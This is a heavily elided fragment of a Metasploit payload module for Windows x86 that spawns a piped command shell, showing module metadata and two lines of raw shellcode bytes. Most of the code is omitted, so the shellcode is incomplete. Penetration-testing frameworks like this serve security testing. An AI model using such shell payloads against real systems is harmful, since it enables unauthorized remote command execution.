## 
#  $Id: shell_shoryuken.rb,v 1.6 2011-03-21 17:26:53-03 nbrito Exp $
##
...
module Metasploit3
	...
	def initialize(info = {})
		super(merge_info(info,
			...
			'Description'   => 'Spawn a piped command shell (Shoryuken)',
			'Author'        => [ 'Nelson Brito' ],
			'License'       => 'GPLv2',
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			...
			'Stage'         =>
				{
					...
					'Payload' =>
						...
						"\xE8\x15\x00\x00\x00\x43\x4D\x44\x20\x2F\x4B\x20\x53\x45\x54\x20" +
						"\x44\x49\x52\x43\x4D\x44\x3D\x2F\x62\x00\x5B\x57\x57\x57\x31\xF6" +
